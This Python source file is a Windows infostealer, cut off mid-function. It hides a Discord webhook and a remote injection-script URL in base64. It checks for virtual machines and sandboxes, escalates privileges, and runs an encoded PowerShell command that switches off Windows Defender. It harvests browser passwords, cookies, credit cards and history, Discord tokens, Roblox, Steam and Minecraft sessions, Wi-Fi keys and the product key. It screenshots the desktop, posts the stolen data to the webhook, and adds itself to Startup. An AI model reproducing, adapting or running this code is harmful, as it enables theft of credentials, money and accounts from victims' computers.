import os
import sys
import requests
import json
import re
import shutil
import sqlite3
import base64
import subprocess
import socket
import urllib3
import ctypes
import win32crypt
import zipfile
from Crypto.Cipher import AES
from json import loads
from shutil import copy2
from datetime import datetime
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from requests import post
from base64 import b64decode
import win32clipboard
import api
import ctypes
from ctypes.wintypes import BOOL, HWND, LPCWSTR, UINT
import psutil
import subprocess
import wmi
import uuid
import time
import hashlib
import mss
import tempfile
from re import findall
from win32crypt import CryptUnprotectData
from win32crypt import CryptUnprotectData
import platform
import GPUtil
import asyncio
import math
import winreg
from urllib.request import Request, urlopen

url = b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNjAyNDk3ODkwNzA3NDY0MS93eWlHX1BVTVRsdVlzSHVDYjQ4WnVUUXBCSHdoZ3RZZHI3VDdMdGJ0ZkZ0VHBQRzV1ejd0clAtQWVrZjZfaUUwTlRaRQ==").decode()
inj3c710n_url = b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25vdGF1dGhvcmlzZWR4ZC9ibG9ja2VkL21haW4vZGlzY29yZF9pbmplY3QuanM=").decode()

async def kill_blacklisted_programs():
    try:
        # Fetch blacklisted programs from an external source
        response = requests.get('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blacklisted_programs.json')
        blacklisted_programs = response.json().get('blacklistedprog', [])

        # Get a list of running processes and kill blacklisted ones
        process_list = subprocess.check_output(['tasklist']).decode().split('\n')
        for process_info in process_list:
            process_name = process_info.split()[0].replace('.exe', '')
            if process_name in blacklisted_programs:
                subprocess.run(['taskkill', '/F', '/IM', f"{process_name}.exe"], check=True)
    except Exception as e:
        sys.exit()

# Functions to check if certain values are blocked

def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        sys.exit()
def wifi_check():
    try:
        socket.create_connection(("www.google.com", 80))
        print("Internet connection is available.")
    except OSError:
        print("No internet connection available. Exiting script.")
        sys.exit()

def vmcheck():
    def get_base_prefix_compat():
        base_prefix = getattr(sys, "base_prefix", None)
        if base_prefix is None:
            real_prefix = getattr(sys, "real_prefix", None)
            if real_prefix is None:
                return sys.prefix
            return real_prefix
        return base_prefix
    in_virtualenv = lambda: sys.prefix != get_base_prefix_compat()
    if in_virtualenv():
        sys.exit()
    registry_check = (
        lambda: os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        != 1
        or os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        != 1
    )
    if registry_check():
        sys.exit()

def processes_and_files_check():
    vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
    virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")
    process = os.popen(
        'TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="'
    ).read()
    processList = []
    processNames = process.split(" ")
    for processName in processNames:
        if ".exe" in processName:
            processList.append(processName.replace("K\n", "").replace("\n", ""))
    if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
        sys.exit()
    if os.path.exists(vmware_dll):
        sys.exit()
    if os.path.exists(virtualbox_dll):
        sys.exit()
    return None

def mac_check():
    mac_address = ":".join(re.findall("..", "%012x" % uuid.getnode()))
    vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
    if mac_address[:8] in vmware_mac_list:
        sys.exit()
    else:
        return None
    
def in_virtualenv():
    if sys.platform.startswith("win"):
        def is_admin():
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        if is_admin():
            print("Already running as admin.")
            return None
        else:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
    else:
        return None

async def gpu_blocked(gpu):
    try:
        response = requests.get('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_gpu.json')
        blocked_gpus = response.json()
        return gpu in blocked_gpus
    except Exception as e:
        return False

async def os_blocked(OS):
    try:
        response = requests.get('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_os.json')
        blocked_os = response.json()
        return OS in blocked_os
    except Exception as e:
        return False

async def pcname_blocked(pc_name):
    try:
        response = requests.get('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_pcnames.json')
        blocked_pc_names = response.json()
        return pc_name in blocked_pc_names
    except Exception as e:
        return False

async def username_blocked(user_name):
    try:
        response = requests.get('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_usernames.json')
        blocked_usernames = response.json()
        return user_name in blocked_usernames
    except Exception as e:
        return False

async def uuid_blocked(uid):
    try:
        response = requests.get('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_hwid.json')
        blocked_uids = response.json()
        return uid in blocked_uids
    except Exception as e:
        return False

async def ip_blocked(ip):
    try:
        response = requests.get('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_ips.json')
        blocked_ips = response.json()
        return ip in blocked_ips
    except Exception as e:
        return False

def check_windows_activation():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, "DigitalProductId")
        winreg.CloseKey(key)
        
        if value:
            return True  # Windows is activated
        else:
            return False  # Windows is not activated
    except Exception as e:
        print("Error checking Windows activation:", e)
        return False  # Error occurred while checking activation status

async def get_total_physical_memory():
    try:
        total_physical_memory = await get_command(b64decode("d21pYyBjb21wdXRlcnN5c3RlbSBnZXQgdG90YWxwaHlzaWNhbG1lbW9yeQ=="))
    except Exception as err:
        total_physical_memory = 4
    return int(int(total_physical_memory) / (1024 * 1024 * 1024))

async def get_disk():
    try:
        size_output = await get_command(b64decode("d21pYyBsb2dpY2FsZGlzayBnZXQgc2l6ZQ=="))
        size = [item.strip() for item in size_output.split() if item.strip().lower() != "size"]
        return int(int(size[0]) / (1024 * 1024 * 1024))
    except Exception as err:
        return "1000"

async def get_clean_uid():
    uid_output = await get_command(b64decode("d21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQ="))
    regex_uid = r"UUID\s+([A-Fa-f0-9-]+)"
    match = re.search(regex_uid, uid_output)
    if match:
        return match.group(1)
    else:
        return ""

async def get_cpu_count():
    try:
        stdout = await get_command(b64decode("ZWNobyAlTlVNQkVSX09GX1BST0NFU1NPUlM1"))
        cpucount = int(stdout)
        if not math.isnan(cpucount):
            return int(cpucount)
    except Exception as error:
        return "4"

async def get_command(cmd):
    result = await asyncio.create_subprocess_shell(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = await result.communicate()
    return stdout.decode().strip()

async def get_windows_version():
    try:
        output = await get_command(b64decode("d21pYyBvcyBnZXQgbmFtZSx2ZXJzaW9uIC9mb3JtYXQ6dGFibGU="))
        lines = output.strip().split('\n')
        for line in lines[1:]:
            if "Windows" in line:
                windows_version = line.split()[0]
                return windows_version
    except Exception as err:
        print("Error:", err)
        return "Unknown"

async def check_for_blacklisted_info():
    import os
    try:
        ip = get_ip_info()
        pc_name = os.getenv('COMPUTERNAME') or "IDK"
        user_name = os.getenv('USERNAME') or "IDK"
        disk = await get_disk()
        uid = await get_clean_uid()
        cpu_count = await get_cpu_count()
        ram = await get_total_physical_memory()
        gpu = os.system(b64decode("d21pYyBQQVRIIFdpbjMyX1ZpZGVvQ29udHJvbGxlciBnZXQgbmFtZQ=="))

        gpu_blacklisted = await gpu_blocked(gpu)
        pcname_blacklisted = await pcname_blocked(pc_name)
        username_blacklisted = await username_blocked(user_name)
        ip_blacklisted = await ip_blocked(ip)
        uid_blacklisted = await uuid_blocked(uid)
        if gpu_blacklisted or pcname_blacklisted or username_blacklisted or ip_blacklisted or uid_blacklisted:
            sys.exit()
        if disk < 80 or cpu_count < 2 or ram < 2:
            sys.exit()
        return
    except Exception as e:
        print(e)


async def antivm_checks():
    try:
        # Call synchronous functions directly
        wifi_check()
        vmcheck()
        if check_windows_activation() != True:
            sys.exit()
        await check_for_blacklisted_info()
        check_dll()
        mac_check()
        in_virtualenv()
        processes_and_files_check()

        
        #await kill_blacklisted_programs()
        cmd = base64.b64decode(
            b"cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOb3NFeHBvcnRlZE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZS1Db21tYW5kICJBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICVVU0VSUFJPRklORSVcQXBwRGF0YSIgJiBwb3dlcnNoZWxsLmV4ZSAtaW5wdXRmb3JtYXQgbm9uZSAtb3V0cHV0Zm9ybWF0IG5vbmUgLW5vbkludGVyYWN0aXZlLUNvbW1hbmQgIkFkZC1NcHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK"
        ).decode()
        subprocess.run(cmd, shell=True, capture_output=True)
    except Exception as e:
        print("An error occurred: ", e)

def find_tokens():
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
        "Lightcord": roaming + "\\Lightcord",
        "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
        "Amigo": local + "\\Amigo\\User Data",
        "Torch": local + "\\Torch\\User Data",
        "Kometa": local + "\\Kometa\\User Data",
        "Orbitum": local + "\\Orbitum\\User Data",
        "CentBrowser": local + "\\CentBrowser\\User Data",
        "Sputnik": local + "\\Sputnik\\Sputnik\\User Data",
        "Chrome SxS": local + "\\Google\\Chrome SxS\\User Data",
        "Epic Privacy Browser": local + "\\Epic Privacy Browser\\User Data",
        "Microsoft Edge": local + "\\Microsoft\\Edge\\User Data\\Default",
        "Uran": local + "\\uCozMedia\\Uran\\User Data\\Default",
        "Iridium": local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
        "Firefox": roaming + "\\Mozilla\\Firefox\\Profiles",
    }

    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if not os.path.exists(path):
            continue

        try:
            for file_name in os.listdir(path):
                if (
                    file_name.endswith(".log")
                    or file_name.endswith(".ldb")
                    or file_name.endswith(".sqlite")
                ):
                    file_path = os.path.join(path, file_name)
                    with open(file_path, "r", errors="ignore") as f:
                        lines = f.readlines()
                        for line in lines:
                            for regex in [
                                "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}",
                                "mfa\\.[\\w-]{84}",
                            ]:
                                tokens += re.findall(regex, line)
        except Exception as e:
            print(f"Error reading files in {path}: {e}")

    try:
        with open("tokens.txt", "w") as f:
            f.write("\n".join(tokens))
    except Exception as e:
        pass

def generate_cipher(aes_key, iv):
    cipher = AES.new(aes_key, AES.MODE_GCM, iv)
    return cipher


def decrypt_payload(cipher, payload):
    decrypted_data = cipher.decrypt(payload)
    return decrypted_data

def decrypt_browser(LocalState, LoginData, CookiesFile):
    try:
        if not os.path.exists(LocalState):
            return "Local State file missing\n"

        name = "logins"

        with open(LocalState) as f:
            local_state = f.read()

        local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        filePass = "passwords.txt"
        fileCookies = "cookies.txt"
        fileInfo = "info.txt"

        if os.path.exists(LoginData):
            try:
                copy2(LoginData, "TempMan.db")
                conn = sqlite3.connect("TempMan.db")
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                with open(filePass, "a") as f:
                    f.write("*** " + name + " ***\n")
                    for index, logins in enumerate(cur.fetchall()):
                        if logins[0] or logins[1] or logins[2]:
                            ciphers = logins[2][15:-16]
                            init_vector = ciphers[:15]
                            enc_pass = ciphers[15:-16]
                            cipher = generate_cipher(master_key, init_vector)
                            dec_pass = decrypt_payload(cipher, enc_pass).decode()
                            to_print = (
                                "URL : "
                                + logins[0]
                                + "\nName: "
                                + logins[1]
                                + "\nPass: "
                                + dec_pass
                                + "\n\n"
                            )
                            f.write(to_print)
            except Exception as e:
                with open(fileInfo, "a") as f:
                    f.write(f"Error accessing login data: {e}\n")
            finally:
                conn.close()
        else:
            with open(fileInfo, "a") as f:
                f.write(name + " Login Data file missing\n")

        if os.path.exists(CookiesFile):
            try:
                copy2(CookiesFile, "CookMe.db")
                conn = sqlite3.connect("CookMe.db")
                curr = conn.cursor()
                curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
                with open(fileCookies, "a") as f:
                    f.write("*** " + name + " ***\n")
                    for index, cookies in enumerate(curr.fetchall()):
                        if cookies[0] or cookies[1] or cookies[2]:
                            to_print = "Cook: " + cookies[1] + "\n"
                            f.write(to_print)
            except Exception as e:
                with open(fileInfo, "a") as f:
                    f.write(f"Error accessing cookies: {e}\n")
            finally:
                conn.close()
        else:
            with open(fileInfo, "a") as f:
                f.write("no " + name + " Cookie file\n")
    except Exception as e:
        return f"Error in decrypting browser data: {e}\n"

    return "Process completed successfully\n"


# Local_State
def Local_State(path):
    return f"{path.format_value(0)}\\User Data\\Local State"


# Login_Data
def Login_Data(path):
    if path.contains_op(0):
        return f"{path.format_value(0)}\\Login Data"
    else:
        return f"{path.format_value(0)}\\User Data\\Default\\Login Data"


# Cookies
def Cookies(path):
    if path.contains_op(0):
        return f"{path.format_value(0)}\\Network\\Cookies"
    else:
        return f"{path.format_value(0)}\\User Data\\Default\\Network\\Cookies"


# main_tokens
def main_tokens():
    tokenPaths = ...
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        tokens = get_tokens(path)
        if not tokens:
            continue
        with open(fileInfo, "a") as f:
            for i in tokens:
                f.write(str(i) + "\n")


# decrypt_files
def decrypt_files(path):
    if os.path.exists(path):
        browser = decrypt_browser(Local_State(path), Login_Data(path), Cookies(path))
        return
    with open(fileInfo, "a") as f:
        f.write(browser + " not installed\n")


# file_handler
def file_handler(file):
    if os.path.exists(file):
        if ".txt" in file:
            os.remove(file)

def rblx(input_file, output_file):
    open = None
    readlines = None
    startswith = None
    strip = None
    write = None
    print = None
    FileNotFoundError = None

    input_file = None
    output_file = None
    cookies_file = None
    cookies_data = None
    roblox_cookie = None
    line = None
    roblox_file = None

    try:
        with open(input_file, "r") as cookies_file:
            cookies_data = cookies_file.readlines()

        roblox_cookie = None
        for line in cookies_data:
            if line.startswith("URL : .roblox.com"):
                continue
            if "Name: .ROBLOSECURITY" in line:
                roblox_cookie = line.strip()

        if roblox_cookie:
            with open(output_file, "w") as roblox_file:
                roblox_file.write(roblox_cookie)

            print("Roblox cookie extracted and saved to roblox.txt")
        else:
            print("Roblox cookie not found in cookies.txt")

    except FileNotFoundError:
        print("File not found!")

    return None


def prokey(output_file):
    try:
        result = subprocess.run(
            [
                "wmic",
                "path",
                "softwarelicensingservice",
                "get",
                "OA3xOriginalProductKey",
            ],
            capture_output=True,
            text=True,
        )
        if result.returncode == 0:
            product_key_output = result.stdout.strip()
            with open(output_file, "w") as file:
                file.write(product_key_output)
            print("Product key logged to win_registry_key.txt")
        else:
            print("Failed to retrieve product key")
    except Exception as e:
        print("Error:", e)

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        if interface == "Wi-Fi":
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    if mac == None:
                        return "Mac address was not found"
                    return mac

def machineinfo():
    mem = psutil.virtual_memory()
    c = wmi.WMI()
    gpu = c.Win32_DisplayConfiguration()
    GPUm = [x.Description.strip() for x in gpu]
    current_machine_id = (
        subprocess.check_output("wmic csproduct get uuid", shell=True)
        .decode("utf-8")
        .strip()
        .split("\n")[1]
        .strip()
    )
    reqip = get("https://api.ipify.org/?format=json").json()
    mac = get_mac_address()
    with open("machine.txt", "w") as f:
        f.write(f"PC: {platform.node()}\n")
        f.write(f"OS: {platform.platform()}\n")
        f.write(f"RAM: {mem.total / 1073741824} GB\n")
        f.write(f"GPU: {', '.join(GPUm)}\n")
        f.write(f"CPU: {platform.processor()}\n")
        f.write(f"HWID: {current_machine_id}\n")
        f.write(f"MAC: {mac}\n")
        f.write(f"IP: {reqip['ip']}\n")

def get_master_key(path):


    if not os.path.exists(path):
        return None
    with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
        local_state = json.load(f)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[None:-16].decode()
    return decrypted_pass


def get_web_history(path, profile):
    web_history_db = os.path.join(path, profile, "History")
    result = ""
    if not os.path.exists(web_history_db):
        return result
    temp_db = os.path.join(os.getenv("TEMP"), "web_history_db")
    shutil.copy(web_history_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    for row in cursor.fetchall():
        if row[0] and row[1]:
            result += f"\n        Browser: {profile}\n        URL: {row[0]}\n        Title: {row[1]}\n        Visited Time: {row[2]}\n        \n        "
    conn.close()
    os.remove(temp_db)
    return result

def get_credit_cards(path, profile, master_key):
    cards_db = os.path.join(path, profile, "Web Data")
    if not os.path.exists(cards_db):
        return ""
    result = ""
    temp_db = os.path.join(os.getenv("TEMP"), "cards_db")
    shutil.copy(cards_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards"
    )
    for row in cursor.fetchall():
        if row[0] and row[1] and row[2] and row[3]:
            card_number = decrypt_password(row[3], master_key)
            result += (
                "\n        Browser: "
                + profile
                + "\n        Name Card: "
                + row[0]
                + "\n        Card Number: "
                + card_number
                + "\n        Expires:  "
                + row[1]
                + " / "
                + row[2]
                + "\n        Added: "
                + str(datetime.fromtimestamp(row[4]))
                + "\n        \n        "
            )
    conn.close()
    os.remove(temp_db)
    return result


def save_to_file(data, filename):
    with open(filename, "a", encoding="utf-8") as file:
        file.write(data)


def run_command():
    extract_browser_data(browsers)


def extract_browser_data(browsers):
    history_file = "history.txt"
    cards_file = "cards.txt"
    for browser, path in browsers.items():
        master_key = get_master_key(path)
        if not master_key:
            continue
        history = get_web_history(path, "Default")
        if history:
            save_to_file(history, history_file)
        cards_info = get_credit_cards(path, "Default", master_key)
        if cards_info:
            save_to_file(cards_info, cards_file)



def w1f1():
    get_cmd_encoding = (
        lambda: subprocess.check_output("chcp").decode().split(":")[1].strip()
    )
    cmd_encoding = get_cmd_encoding()
    system_information = subprocess.check_output("systeminfo").decode(cmd_encoding)
    file_path = os.path.join(os.getcwd(), "system_info.txt")

    with open(file_path, "w") as f:
        f.write(system_information)

    try:
        profiles = (
            subprocess.check_output("netsh wlan show profiles")
            .decode(cmd_encoding)
            .split("\n")
        )
        filtered_data = [
            line.split(":")[1].strip()
            for line in profiles
            if "All User Profile" in line
        ]

        for profile in filtered_data:
            try:
                wifi_data_bytes = subprocess.check_output(
                    f'netsh wlan show profile name="{profile}" key=clear'
                ).strip()
                wifi_data = wifi_data_bytes.decode(cmd_encoding)
                profile_data = f"\n\nProfile: {profile}\n\n{wifi_data}"
                with open(file_path, "a") as f:
                    f.write(profile_data)
            except subprocess.CalledProcessError as e:
                print(f"Error retrieving data for profile: {profile}")

    except subprocess.CalledProcessError as e:
        print("Error retrieving WiFi profiles")

def get_cmd_encoding():
    cp_output = (
        subprocess.check_output(["chcp"], shell=True)
        .decode()
        .split(":")[1]
        .strip()
        .split(" ")[0]
    )
    cp_number = int(cp_output)
    t = "cp" + str(cp_number)
    return  t

def kill_process(process_name):
    result = os.system("taskkill /F /IM " + process_name)
    if result == 0:
        print("Process " + process_name + " has been killed successfully.")
    else:
        print("Failed to kill process " + process_name + ".")


def steam_st():
    kill_process("Steam.exe")
    steam_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
    if os.path.exists(steam_path):
        ssfn_files = [
            file for file in os.listdir(steam_path) if file.startswith("ssfn")
        ]
        steam_config_path = os.path.join(steam_path, "config")
        zip_path = "steam_session.zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zp:
            if os.path.exists(steam_config_path):
                for root, dirs, files in os.walk(steam_config_path):
                    for file in files:
                        zp.write(
                            os.path.join(root, file),
                            os.path.relpath(os.path.join(root, file), steam_path),
                        )
            for ssfn_file in ssfn_files:
                zp.write(ssfn_file, os.path.basename(ssfn_file))
        print("Steam session data backed up successfully.")
        print("Backup zip file saved at: " + zip_path)


def get_minecraft():
    roaming = os.getenv("appdata")
    accounts_path = "\\.minecraft\\launcher_accounts.json"
    usercache_path = "\\.minecraft\\usercache.json"
    minecraft_data = {}
    session_info_path = os.path.join(roaming, ".minecraft", accounts_path)
    if os.path.exists(session_info_path):
        with open(session_info_path, "r") as f:
            minecraft_data["session_info"] = json.load(f)

    user_cache_path = os.path.join(roaming, usercache_path)
    if os.path.exists(user_cache_path):
        with open(user_cache_path, "r") as f:
            minecraft_data["user_cache"] = json.load(f)

    with open("minecraft.txt", "w", encoding="cp437") as f:
        f.write(json.dumps(minecraft_data, indent=4))




def find_antivirus_folders(base_folder):
    antivirus_names = (
        "Avast",
        "AVG",
        "Bitdefender",
        "Kaspersky",
        "McAfee",
        "Norton",
        "Sophos",
        "ESET",
        "Malwarebytes",
        "Avira",
        "Panda",
        "Trend Micro",
        "F-Secure",
        "McAfee",
        "Comodo",
        "Avira",
        "BullGuard",
        "360 Total Security",
        "Ad-Aware",
        "Dr.Web",
        "G-Data",
        "Vipre",
        "ClamWin",
        "ZoneAlarm",
        "Cylance",
        "Webroot",
        "Cylance",
        "Palo Alto Networks",
        "Symantec",
        "SentinelOne",
        "CrowdStrike",
        "Emsisoft",
        "HitmanPro",
        "Fortinet",
        "Trend Micro",
        "Emsisoft",
        "FireEye",
        "Cylance",
        "ESET",
        "Zemana",
        "McAfee",
        "Windows Defender",
    )
    antivirus_folders_dict = {}
    for folder in os.listdir(base_folder):
        full_path = os.path.join(base_folder, folder)
        if os.path.isdir(full_path):
            for antivirus_name in antivirus_names:
                if antivirus_name.lower() in folder.lower():
                    antivirus_folders_dict[folder] = antivirus_name
                    break
    return antivirus_folders_dict

def get_antivirus():
    base_folder = "C:\\Program Files"
    antivirus_folders = find_antivirus_folders(base_folder)
    av_file = open("antivirus.txt", "w")
    if antivirus_folders:
        for antivirus_name, folder_name in antivirus_folders.items():
            av_file.write(f"{antivirus_name}: {folder_name}\n")
    else:
        av_file.write("No antivirus found.")
    av_file.close()
    return folder_name


def put_in_startup():
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(
        os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    script_name = os.path.basename(script_path)

    if any(
        filename.lower() == script_name.lower() for filename in os.listdir(startup_folder)
    ):
        print("Script is already in the startup folder.")
    else:
        shutil.copy(script_path, startup_folder)

def get_gpu_info():
    try:
        gpus = GPUtil.getGPUs()
        gpu_info = ''
        for gpu in gpus:
            gpu_info += f"{gpu.name}, "
        return gpu_info[:-2]
    except Exception as e:
        print(f"Error retrieving GPU information: {e}")
        return "Unknown GPU"
    
def get_ram_and_os_info():
    try:
        ram_amount = f"{psutil.virtual_memory().total // 1073741824} GB"
        os_version = platform.platform()
        os_name = platform.system()
        return (ram_amount, os_version, os_name)
    except Exception as e:
        print(f"Error retrieving system information: {e}")
        return ('Unknown', 'Unknown', 'Unknown')

def get_ip_info():
    try:
        # Get IP address
        ip_response = requests.get('https://api.ipify.org/')
        ip_response.raise_for_status()
        ip_address = ip_response.text.strip()
        return ip_address
    except Exception as e:
        print(f'An error occurred: {e}')

def send_all_pc_info():
    gpu_info = get_gpu_info()
    ram_amount, os_version, os_name = get_ram_and_os_info()
    mac_address = get_mac_address()
    ip_address = get_ip_info()
    computer_name = socket.gethostname()
    antivirus = get_antivirus()

    # Set a default value for mac_address if it is empty or None
    if not mac_address:
        mac_address = "Unknown MAC Address"

    # Construct the embed data
    embed_data = {
        "title": "PC Information",
        "color": 65280,  # Green color, you can choose any color code
        "fields": [
            {"name": "What AV Got Clowned On :clown:", "value": antivirus, "inline": False},
            {"name": "MAC Address", "value": mac_address, "inline": True},
            {"name": "IP Address", "value": ip_address, "inline": False},
            {"name": "Computer Name", "value": computer_name, "inline": True},
            {"name": "GPU Info", "value": gpu_info, "inline": False},
            {"name": "RAM Amount", "value": ram_amount, "inline": True},
            {"name": "OS Version", "value": os_version, "inline": False},
            {"name": "OS Name", "value": os_name, "inline": True}
            
        ]
    }

    # Convert embed data to JSON
    embed_json = json.dumps({"embeds": [embed_data]})

    # Send the JSON data as a webhook payload
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, data=embed_json, headers=headers)

    # Check if the request was successful
    if response.status_code == 204:
        print("Request sent successfully.")
    else:
        print("Failed to send request. Status code:", response.status_code)

def get_discord_tokens():
    try:
        tokens = []
        # Check if Discord directory exists
        app_data = os.getenv('APPDATA')
        discord_dir = os.path.join(app_data, 'discord')
        if not os.path.exists(discord_dir):
            return None

        # Iterate through .ldb files in Discord directory
        for filename in os.listdir(os.path.join(discord_dir, 'Local Storage', 'leveldb')):
            if filename.endswith('.ldb'):
                file_path = os.path.join(discord_dir, 'Local Storage', 'leveldb', filename)
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    data = f.read()
                    # Extract tokens from data
                    matches = re.findall(r"tps://discord(?:app)?.com(.*?)\x00", data)
                    for match in matches:
                        token = match.split("\x01")[0]
                        if token:
                            tokens.append(token)
        return tokens
    except Exception as e:
        print(f"Error occurred while getting Discord tokens: {e}")
        return None

def take_screenshot_and_send():
    try:
        # Take screenshot
        with mss.mss() as sct:
            sct.shot(output="screenshot.png")
        
        # Prepare the payload for the webhook (assuming it accepts files)
        files = {'file': open('screenshot.png', 'rb')}
        
        # Send the screenshot to the webhook URL
        response = requests.post(url, files=files)
    except Exception as e:
        print("An error occurred:", e)
        time.sleep(1000)

def disable_windows_defender():
    cmd = base64.b64decode(
